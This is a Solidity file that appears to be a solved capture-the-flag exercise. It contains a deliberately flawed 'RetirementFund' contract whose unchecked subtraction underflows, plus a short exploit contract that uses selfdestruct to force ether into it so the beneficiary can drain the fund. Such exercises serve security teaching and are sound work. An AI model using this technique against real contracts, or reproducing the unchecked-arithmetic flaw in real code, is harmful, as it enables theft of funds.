// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/console2.sol";

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    // ok so where in the function can the ether be transferred
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    //this is for the owner
    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    // this is for the beneficiary
    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            // 1 ether - 2 ether = underflow
            withdrawn += startBalance - address(this).balance;
            // an early withdrawal occurred
            require(withdrawn > 0);
        }
        console2.log("withdrawn: ", withdrawn);

        // penalty is what's left
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
// I am the beneficiary
// start balance is 1 ether
contract ExploitContract {
    RetirementFund public retirementFund;
    address public player;

    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }

    // write your exploit functions below

    function exploit() public payable {
        console2.log("exploit entered");
        selfdestruct(payable(address(retirementFund)));

        //now that they have 2 ether
        // withdraw
    }
}
